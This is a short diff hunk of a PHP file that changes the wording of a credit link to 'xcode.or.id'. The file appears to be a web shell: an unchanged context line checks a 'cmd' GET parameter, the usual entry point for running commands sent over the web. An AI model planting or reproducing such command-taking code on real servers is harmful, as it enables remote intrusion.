@@ -86,7 +86,7 @@ body {
 <?php
 if (empty($_REQUEST)) {
 	echo '<br>';
-	echo '<a href="https://xcode.or.id">Dibuat Oleh Kurniawan X-code</a>';
+	echo '<a href="https://xcode.or.id">Dibangun Oleh Kurniawan X-code</a>';
 } 
 
 if (!empty($_GET['cmd'])) { 
